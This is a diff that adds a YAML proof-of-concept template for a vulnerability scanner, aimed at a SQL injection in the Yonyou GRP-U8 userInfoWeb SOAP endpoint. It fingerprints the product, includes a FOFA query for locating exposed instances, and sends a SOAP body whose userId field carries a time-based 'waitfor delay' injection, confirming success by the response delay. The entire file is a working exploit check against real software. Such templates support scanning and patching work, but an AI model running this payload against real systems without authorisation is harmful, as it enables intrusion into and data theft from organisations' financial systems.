@@ -1,0 +1,39 @@
+id: poc-yaml-yongyou-grp-u8-userinfoweb-sqli
+info:
+  name: 用友GRP-U8 userInfoWeb SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /login.jsp
+  expression: status_code == 200 && contains(title,"用友GRP-U8")
+- method: POST
+  path: /services/userInfoWeb
+  headers:
+    SOAPAction: null
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:ser=\"http://service.pt.midas.ufgov.com\">\n<soapenv:Body>\n<ser:getUserNameById\
+    \ soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n   <userId\
+    \ xsi:type=\"soapenc:string\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\"\
+    >';waitfor delay '0:0:{{.t1}}'--</userId>\n</ser:getUserNameById>\n</soapenv:Body>\n\
+    </soapenv:Envelope>"
+  expression: 'status_code == 200 &&
+
+    contains(body,"getUserNameByIdResponse") &&
+
+    contains(content_type,"text/xml") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
